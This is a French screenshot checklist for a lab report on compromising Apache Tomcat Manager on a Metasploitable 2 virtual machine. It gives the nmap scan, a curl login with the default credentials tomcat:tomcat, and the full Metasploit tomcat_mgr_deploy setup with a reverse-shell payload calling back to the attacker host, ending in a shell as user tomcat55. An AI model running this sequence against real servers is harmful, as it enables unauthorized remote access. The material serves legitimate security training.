# Captures — Tomcat Manager, déploiement de WAR (MS2, port 8180)

Cible : `192.168.56.101` · Kali/LHOST : `192.168.56.1`.
5 captures. Chaque capture montre **la commande tapée ET son résultat** (prompt visible).

## 01-recon-nmap.png

Commande :
```bash
nmap -sV -p 8180 192.168.56.101
```

Encadrer en rouge : la ligne `8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1`.

## 02-manager-creds.png

Vérifier l'accès au Manager avec les identifiants par défaut :
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101:8180/manager/html
curl -s -u tomcat:tomcat http://192.168.56.101:8180/manager/html | grep -i "Tomcat Web Application Manager"
```

Encadrer en rouge : le `401` (sans identifiant) et la ligne `Tomcat Web Application Manager`
(avec `tomcat:tomcat`). Option : une capture navigateur de la page Manager connectée.

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
```

Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2009-3548` sous
`References`.

## 04-exploit-config.png

En interactif dans `msfconsole`, commande par commande :
```
msf6 > use exploit/multi/http/tomcat_mgr_deploy
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set RPORT 8180
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword tomcat
msf6 exploit(...) > set payload java/shell_reverse_tcp
msf6 exploit(...) > set LHOST 192.168.56.1
msf6 exploit(...) > set LPORT 4447
```

Encadrer en rouge : aucun (liste des `set` déjà lisible).

## 05-session-tomcat55.png

Déclenchement + preuve, dans la même session :
```
msf6 exploit(...) > run -z
msf6 exploit(...) > sessions -c "id; uname -a; hostname; whoami" -i 1
```

Encadrer en rouge : la ligne `[*] Command shell session 1 opened ...` et la ligne
`uid=110(tomcat55) gid=65534(nogroup) ...`.
